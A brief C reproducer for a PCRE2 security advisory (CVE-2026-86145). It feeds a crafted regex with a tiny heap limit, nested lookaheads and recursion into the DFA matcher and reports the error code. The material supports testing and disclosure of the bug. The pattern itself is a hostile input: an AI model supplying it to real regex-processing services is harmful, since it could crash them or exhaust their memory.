/* Public-API consumer for PCRE2 GHSA-3r4p-g7gg-ppmf / CVE-2026-86145.
 * Exact upstream reproducer pattern and subject; only the regex is hostile. */
#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>

int main(void)
{
    const char *pattern =
        "(*LIMIT_HEAP=4)(?=(?=(?=(?=(?=(?=(?=(?=a))(?R))))))).";
    const char *subject = "a";
    int errcode, rc;
    PCRE2_SIZE erroffset;
    pcre2_code *code;
    int workspace[20000];
    pcre2_match_data *md;

    code = pcre2_compile_8((PCRE2_SPTR)pattern, PCRE2_ZERO_TERMINATED, 0,
                           &errcode, &erroffset, NULL);
    if (code == NULL)
    {
        fprintf(stderr, "compile failed err=%d off=%zu\n", errcode,
                (size_t)erroffset);
        return 2;
    }
    md = pcre2_match_data_create_from_pattern_8(code, NULL);
    rc = pcre2_dfa_match_8(code, (PCRE2_SPTR)subject, 1, 0, 0, md, NULL,
                           workspace, 20000);
    printf("rc=%d (PCRE2_ERROR_HEAPLIMIT=-63)\n", rc);
    pcre2_match_data_free(md);
    pcre2_code_free(code);
    return 0;
}
